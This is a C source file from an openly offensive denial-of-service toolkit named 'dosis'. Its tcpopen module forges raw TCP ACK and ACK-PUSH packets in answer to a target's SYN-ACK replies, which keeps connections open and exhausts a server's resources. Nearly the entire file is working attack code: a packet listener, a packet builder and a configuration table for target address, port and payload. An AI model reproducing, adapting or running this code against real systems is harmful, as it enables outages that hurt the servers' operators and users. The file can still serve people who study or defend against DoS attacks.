/*****************************************************************************
 * tcpopen.c
 *
 * DoS on TCP servers by leaving connections opened.
 *
 * ---------------------------------------------------------------------------
 * dosis - DoS: Internet Sodomizer
 *   (C) 2008-2009 Gerardo García Peña <gerardo@kung-foo.net>
 *
 *   This program is free software; you can redistribute it and/or modify it
 *   under the terms of the GNU General Public License as published by the Free
 *   Software Foundation; either version 2 of the License, or (at your option)
 *   any later version.
 *
 *   This program is distributed in the hope that it will be useful, but WITHOUT
 *   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 *   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 *   more details.
 *
 *   You should have received a copy of the GNU General Public License along
 *   with this program; if not, write to the Free Software Foundation, Inc., 51
 *   Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *****************************************************************************/

#include <config.h>

#include "log.h"
#include "dosis.h"
#include "dosconfig.h"
#include "tea.h"
#include "tcpopen.h"
#include "lnet.h"
#include "payload.h"
#include "pthreadex.h"
#include "ip.h"

#define BUFSIZE    2048

typedef struct _tag_TCPOPEN_CFG {
  TEA_TYPE_ADDR  shost;
  TEA_TYPE_ADDR  dhost;
  TEA_TYPE_INT   npackets;
  TEA_TYPE_DATA  payload;
  TEA_TYPE_INT   tcp_mss;
  TEA_TYPE_INT   tcp_win;
  TEA_TYPE_INT   delay;

  LN_CONTEXT     lnc;
} TCPOPEN_CFG;

/*****************************************************************************
 * THREAD IMPLEMENTATION
 *****************************************************************************/

static int tcpopen__listen_check(THREAD_WORK *tw, int proto, char *msg, unsigned int size)
{
  TCPOPEN_CFG *tc = (TCPOPEN_CFG *) tw->data;

  switch(proto)
  {
    case INET_FAMILY_IPV4:
DBG("---------------- IP VER %d ------------------", IP_PROTOCOL(msg));
      /* check msg size and headers */
      if(size < sizeof(struct iphdr)
      || IP_PROTOCOL(msg) != 4
      || size < sizeof(struct tcphdr) + (IP_HEADER(msg)->ihl << 2))
        return 0;

      /* check msg */
      return IP_HEADER(msg)->saddr == tc->dhost.addr.addr.in.addr
          && ntohs(TCP_HEADER(msg)->source) == tc->dhost.port
             ? -1 : 0;

    case INET_FAMILY_IPV6:
#warning "IPv6 not implemented."
      return 0;
  }

  return 0;
}

static void tcpopen__send_kakita(TEA_MSG *m, THREAD_WORK *tw)
{
  TCPOPEN_CFG *tc = (TCPOPEN_CFG *) tw->data;
  TEA_MSG *t;

  /* send handshake and data TCP packet */
DBG("Building TCP-ACK packet...");
  if((t = msg_build_ip_tcp_packet(&tc->shost.addr, ntohs(TCP_HEADER(m->b)->th_dport),
                                  &tc->dhost.addr, ntohs(TCP_HEADER(m->b)->th_sport),
                                  TH_ACK,
                                  tc->tcp_win,
                                  ntohl(TCP_HEADER(m->b)->ack_seq),
                                  ntohl(TCP_HEADER(m->b)->seq) + 1,
                                  NULL, 0,
                                  NULL, 0)) == NULL)
    TFAT("Cannot build syn packet.");
DBG("Enqueuing TCP-ACK packet...");
  tea_thread_msg_send(&tc->lnc, t, tc->delay);

DBG("Building TCP-ACK-DATA-PUSH packet...");
  if((t = msg_build_ip_tcp_packet(&tc->shost.addr, ntohs(TCP_HEADER(m->b)->th_dport),
                                  &tc->dhost.addr, ntohs(TCP_HEADER(m->b)->th_sport),
                                  TH_ACK | TH_PUSH,
                                  tc->tcp_win,
                                  ntohl(TCP_HEADER(m->b)->ack_seq),
                                  ntohl(TCP_HEADER(m->b)->seq) + 1,
                                  (char *) tc->payload.data, tc->payload.size,
                                  NULL, 0)) == NULL)
    TFAT("Cannot build ack packet.");
DBG("Enqueuing TCP-ACK-DATA-PUSH packet...");
  tea_thread_msg_send(&tc->lnc, t, tc->delay);
DBG("Send_kakita() finished.");
}

static void tcpopen__thread(THREAD_WORK *tw)
{
  TCPOPEN_CFG *tc = (TCPOPEN_CFG *) tw->data;
  TEA_MSG *m;

  /* listen the radio */
  while(1)
  {
    /* check for messages */
    m = tea_thread_msg_wait(tw);

    TDBG2("Received << %d - %d.%d.%d.%d:%d/%d (rst=%d,syn=%d,ack=%d) => [%08x/%08x] >>",
            IP_PROTOCOL(m->b),
            (IP_HEADER(m->b)->saddr >>  0) & 0x00ff,
            (IP_HEADER(m->b)->saddr >>  8) & 0x00ff,
            (IP_HEADER(m->b)->saddr >> 16) & 0x00ff,
            (IP_HEADER(m->b)->saddr >> 24) & 0x00ff,
            TCP_HEADER(m->b)->dest, tc->dhost.port,
            TCP_HEADER(m->b)->rst,
            TCP_HEADER(m->b)->syn,
            TCP_HEADER(m->b)->ack,
            IP_HEADER(m->b)->saddr, tc->shost.addr.addr.in.addr);

    /* in some special case (handshake) send kakitas */
    if(TCP_HEADER(m->b)->syn != 0
    && TCP_HEADER(m->b)->ack != 0)
      tcpopen__send_kakita(m, tw);

    /* release msg buffer */
    msg_release(m);
  }
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * CONFIGURATION. 
 *   Is important to consider that this function could be
 *   called several times during thread live: initial
 *   configuration and reconfigurations.
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

static int tcpopen__configure(THREAD_WORK *tw, SNODE *command, int first_time)
{
  TCPOPEN_CFG *tc = (TCPOPEN_CFG *) tw->data;

  /* initialize specialized work thread data */
  if(first_time)
  {
    /* initialize libnet */
    ln_init_context(&tc->lnc);
  }

  /* configure src address (if not defined) */
  if(tc->shost.addr.type == INET_FAMILY_NONE
  && dos_get_source_address(&tc->shost.addr, &tc->dhost.addr))
    return -1;

  /* (debug) print configuration */
  {
    char buff[255];

    TDBG2("config.periodic.bytes  = %d", tc->payload.size);

    ip_addr_snprintf(&tc->shost.addr, tc->shost.port, sizeof(buff)-1, buff);
    TDBG2("config.options.shost   = %s", buff);
    ip_addr_snprintf(&tc->dhost.addr, tc->dhost.port, sizeof(buff)-1, buff);
    TDBG2("config.options.dhost   = %s", buff);
    TDBG2("config.options.payload = %d bytes", tc->payload.size);
  }

  return 0;
}

static void tcpopen__cleanup(THREAD_WORK *tw)
{
  TCPOPEN_CFG *tc = (TCPOPEN_CFG *) tw->data;

  if(tc)
  {
    /* collect libnet data */
    ln_destroy_context(&tc->lnc);
    if(tc->payload.data)
    {
      free(tc->payload.data);
      tc->payload.data = NULL;
    }
  }
  TDBG("Finalized.");
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * TEA OBJECT
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

TOC_BEGIN(teaTCPOPEN_cfg)
  TOC("src_addr", TEA_TYPE_ADDR, 0, TCPOPEN_CFG, shost,   NULL)
  TOC("src_port", TEA_TYPE_PORT, 0, TCPOPEN_CFG, shost,   NULL)
  TOC("dst_addr", TEA_TYPE_ADDR, 1, TCPOPEN_CFG, dhost,   NULL)
  TOC("dst_port", TEA_TYPE_PORT, 0, TCPOPEN_CFG, dhost,   NULL)
  TOC("payload",  TEA_TYPE_DATA, 1, TCPOPEN_CFG, payload, NULL)
  TOC("tcp_mss",  TEA_TYPE_INT,  0, TCPOPEN_CFG, tcp_mss, NULL)
  TOC("tcp_win",  TEA_TYPE_INT,  1, TCPOPEN_CFG, tcp_win, NULL)
TOC_END

TEA_OBJECT teaTCPOPEN = {
  .name         = "TCPOPEN",
  .datasize     = sizeof(TCPOPEN_CFG),
  .configure    = tcpopen__configure,
  .cleanup      = tcpopen__cleanup,
  .thread       = tcpopen__thread,
  .listener     = 1,
  .listen_check = tcpopen__listen_check,
  .cparams      = teaTCPOPEN_cfg
};

